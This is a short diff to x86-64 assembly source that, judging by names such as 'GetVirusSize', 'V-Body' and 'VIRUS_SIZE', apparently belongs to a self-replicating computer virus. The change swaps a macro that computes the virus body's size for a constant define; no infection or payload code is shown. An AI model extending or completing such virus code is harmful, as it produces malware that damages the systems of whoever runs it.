@@ -43,11 +43,7 @@
 
 ; WRAPPERS >----------------------------------------------------------------<
 
-%macro GetVirusSize 0
-  mov   rcx,  VExitRoutine
-  mov   rbx,  _start
-  sub   rcx,  rbx           ; rcx = size V-Body
-%endmacro
+%define VIRUS_SIZE          (VExitRoutine - _start)
 
 %macro Write 3
   mov   rdi,  %1          ; fd
